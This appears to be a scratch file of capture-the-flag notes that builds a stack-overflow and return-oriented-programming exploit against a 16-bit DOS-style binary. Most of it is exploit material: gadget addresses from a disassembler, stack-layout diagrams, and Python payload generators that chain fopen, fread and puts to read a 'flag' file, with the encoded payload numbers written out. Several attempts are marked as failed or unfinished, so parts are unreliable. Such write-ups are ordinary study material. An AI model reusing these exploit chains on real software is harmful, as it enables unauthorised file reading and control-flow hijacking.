"""
FULL VERSION (the short one is in the writeup above), this version includes all the things that didn't worked


" ".join(str(i) for i in range(24)) + " " + str(0xff00 ^ 0x3f00)  # sets sp to 0xff41 in the same segment (data segment?) (cannot change the ff)
 
" ".join(str(i) for i in range(24)) + " " + str(0x8100)  # set sp to point at our buffer[0], which is useful...

str(0xffff ^ 0x4142) + " 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 " + str(0x8100)  # set sp to point at our buffer[0], which is useful...


==== HIGH LEVEL PLAN: ==== 
I have control on the instruction pointer (but only on the code segment)
I need to compile an assembly code of pop cs and then search the bits in IDA to find suitable gadget.
__________
| gadget |  # pop cs ; ret gadget (hopefully)
|========|
| ds:ret |  # return addres in data segment (shellcode addr)
|========|
|   sc   |  # shellcode
|========|
|padding |  # make the 0x8100 at position 26
|========|
| 0x8100 |  # for jumping to my gadget
|========|

THAT IS CANNOT BE DONE (because we cannot jump to the data section). we need to create ROP:

    call fopen("flag", "r")
    (push ax gadget?)
    call fread (0x4141, 100, 1, ax)
    call puts(0x4141)
_______________  # (all values are hexadecimal)
|  "r" addr   |  # ds:0167
|=============|  
| "flag" addr |  # ds:01C2
|=============|
|    fopen    |  # cs:23ED
|=============|
|  pop gadget |  # cs:1540  (TODO is neccecery?)
|=============|
|   push ax   |
|=============|
|             |
|=============|
|             |
|=============|
|             |
|=============|
|             |
|=============|
|   padding   |
|=============|
| line 34 addr|
|=============|

(pop gadget for functions with 2 arguments)
    seg000:1540                 pop     di
    seg000:1541                 pop     si
    seg000:1542                 pop     bp
    seg000:1543                 retn

(syscall ; ret )
    seg000:0275                 int     21h
    seg000:0277                 retn

(pop ax ; pop bp ; ret)  (I removed the jump)
    seg000:304C                 pop     ax
    seg000:3053                 pop     bp
    seg000:3054                 retn

(pop dx ; pop cx; pop bx; ret)
    seg000:102E                 pop     dx
    seg000:102F                 pop     cx
    seg000:1030                 pop     bx
    seg000:1031                 retn

(add sp, 5)
    seg000:1C6B                 add     sp, 6
    seg000:1C6E                 retn



TODO IS THE RETURN VALUEE OF FOPEN IS PREDICTABLE???
IF IT DOES, WE CAN JUST JUMP TO A GADGET OF POP BP AND SET A STACK FRAME WITH THE VALUES

    call fopen("flag", "r")
    (push ax gadget?)
    call fread (0x4141, 100, 1, ax)
    call puts(0x4141)
_______________  # (all values are hexadecimal)
|  "r" addr   |  # ds:0167
|=============|  
| "flag" addr |  # ds:01C2
|=============|
|    fopen    |  # cs:23ED
|=============|
|   pop bp    |  # cs:1542 set bp 
|=============|
|line 115 addr|
|=============|
|  ret fopen  |  # if predictable!!!!
|=============|
|     1       |
|=============|
|    100      |
|=============|
|   0x4141    |
|=============|
|   _fread    |
|=============|
|   pop bp    |  # cs:1542 set bp 
|=============|
|line 123 addr|
|=============|
|   0x4141    |
|=============|
|    _puts    |
|=============|
|   padding   |
|=============|
|line 101 addr|
|=============|

# the read_buffer starts at ss:FF80 and ends at ss:
17 is at ss:FFAE 
junk values until

def p(val):
    return str(0xffff ^ val) + " "

p(0x0167) + 
p(0x01C2) + 
p(0x23ED) + 
p(0x1542) + 
p(0x4141) + 


print(
p(0x23ED) + 
p(0x01C2) + 
p(0x0167) + 
p(0x4444) + 
p(0x4545) + 
p(0x4646) + 
p(0x4747) + # 2 (should jump here)
p(0x4848) + 
p(0x4949) + 
p(0x4a4a) + 
p(0x4b4b) + 
p(0x4c4c) + 
p(0x4d4d) + 
p(0x4e4e) + 
p(0x4f4f) + 
p(0x5050) + # 10
p(0x5151) + 
p(0x5252) + 
p(0x5353) + 
p(0x5454) + 
p(0x5555) + # 15
p(0x5656) + 
p(0x5757) + 
p(0x5858) + 
p(0x5959) + # 19
p(0x8000)  # calls fopen("flag", "r")
)


0x0000
arg2
arg1
return_addr
bp

0xffff

----

===== FOPEN FLAG AND CALL MAIN (WORKING) =====
print(
p(0x23ED) + # fopen
p(0x0590) + # main
p(0x0162) + # flag
p(0x0167) + # r
p(0x4141) + # trash
" 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 " + 
p(0x7eff)
)

56338 64111 65181 65176 48830  5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 33024
----
===== FREAD FLAG INTO 0x4141 (NOT WORKING) 

-> readme!! you need to try the last payload again and make it go to arbitrary address again (on the second round of main). then try to perform fread.  (return value 0x0378)

print(
p(0x23ED) + # fopen
p(0x0590) + # main
p(0x0162) + # flag
p(0x0167) + # r
p(0x4141) + # trash
" 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 " + 
p(0x0cff)
)



#p(0x24DF) +  # jump addr
#p(0x0590) +  # return addr (main)
#p(0x4141) +  # buffer (change?)
#p(0x0100) +  # size
#p(0x0001) +  # count
#p(0x0378) +  # FILE

(this one is now working because the next calls override our buffer in memory and leaves us withou the FILE value :(( )

=========== NEW DIRECTION: override the return address of _verify_keys with ROP
-> opens file and calls main
print(
    "10 " * 16+  # padding
    p(0xAAAA) +  # padding
    p(0xFFB2) +  # Base Pointer
    p(0x23ED) +  # _fopen
    p(0x0590) +  # return addr (main)
    p(0x01C2) +  # flag
    p(0x0167) +  # r
    p(0xFFFF) +  # padding
    p(0xFFFF) +  # padding
    p(0xFFFF)    # padding
)

10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 21845 77 56338 64111 65085 65176 0 0 0  

-> after this we should be in main again
print(
    "10 " * 16+  # padding
    p(0xAAAA) +  # padding
    p(0xFF72) +  # Base Pointer
    p(0x24DF) +  # _fread
    p(0x0590) +  # return addr (main)
    p(0x01A8) +  # flag_buffer (currently the location of "user id: " string in the data sction.)
    p(0x0100) +  # size
    p(0x0001) +  # count
    p(0x0378) +  # FILE (predictable)
    p(0xFFFF)    # padding
)

10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 21845 141 56096 64111 65111 65279 65534 64647 0
"""
